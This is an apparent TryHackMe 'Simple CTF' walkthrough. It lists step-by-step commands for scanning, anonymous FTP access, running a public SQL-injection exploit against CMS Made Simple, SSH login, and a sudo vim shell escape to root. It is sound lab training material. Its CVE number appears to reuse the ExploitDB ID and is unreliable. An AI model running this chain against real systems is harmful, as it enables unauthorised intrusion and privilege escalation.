# TryHackMe Simple CTF Walkthrough

## Introduction
This challenge is designed for beginners to practice essential penetration testing skills including scanning, enumerating services, exploiting known vulnerabilities, cracking hashed passwords, SSH access, and privilege escalation to retrieve user and root flags.

---

## Initial Step: Save Target IP

Set the target IP in a shell variable to simplify commands:

```
export ip=<TARGET_IP>
```

Replace `<TARGET_IP>` with the actual IP address provided by TryHackMe.

---

## 1. Port Scanning and Service Enumeration

Run a standard Nmap scan with default scripts and version detection:

```
nmap -sC -sV $ip
```

Look for open ports, commonly:

- 21 (FTP) — anonymous login usually enabled
- 80 (HTTP) — web server hosting CMS Made Simple
- 2222 (SSH) — alternative SSH port

---

## 2. FTP Enumeration

Connect with anonymous login since the FTP server allows it:

```
ftp $ip
```

Use:

- Username: `anonymous`
- Password: (press Enter)

Navigate and list directory contents:

```
cd pub
ls
```

Download any interesting files such as:

```
get ForMitch.txt
```

---

## 3. Web Directory Discovery

Enumerate web directories with Gobuster:

```
gobuster dir -u http://\$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Find hidden directories like `/simple`.

---

## 4. Vulnerability Identification and Exploitation

The web app uses CMS Made Simple 2.2.8, known to be vulnerable to SQL injection (CVE-2019-46635).

Search for the public exploit:

```
searchsploit "CMS Made Simple 2.2.8"
```

Identify ExploitDB ID 46635.

Copy the exploit script locally:

```
searchsploit -m 46635
```

Install dependencies for Python 2 exploit:

```
sudo pip2 install termcolor
```

Run the exploit script against the target:

```
python2 46635.py -u http://$ip/simple
```

This will output username (e.g., `mitch`), the password hash, salt and password.

---

## 5. SSH Access

SSH into the machine using discovered credentials:

```
ssh mitch@\$ip -p 2222
```

Retrieve user flag:

```
cat /home/mitch/user.txt
```

---

## 6. Privilege Escalation to Root

Check allowed sudo commands:

```
sudo -l
```

Notice that `vim` can be run with root privileges.

Start vim as root:

```
sudo /usr/bin/vim
```

Within vim, spawn a shell:

```
:!/bin/bash
```

Now with a root shell, access and read the root flag:

```
cd /root
cat root.txt
```
